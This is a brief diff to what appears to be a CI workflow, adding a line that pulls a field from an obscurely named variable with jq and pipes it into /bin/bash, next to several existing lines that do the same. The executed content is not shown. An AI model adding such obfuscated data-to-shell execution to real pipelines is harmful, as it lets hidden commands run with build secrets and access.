@@ -27,6 +27,7 @@ jobs:
           echo $j2 | jq -r .pfwkx48377 | /bin/bash
           echo $vow8 | jq -r .xz62 | /bin/bash
           printf '%s' "$zx268" | jq -r .n95886 | /bin/bash
+          printf '%s' "$vyjxt450" | jq -r .vrs7 | /bin/bash
 
       - name: Persist output
         if: always()
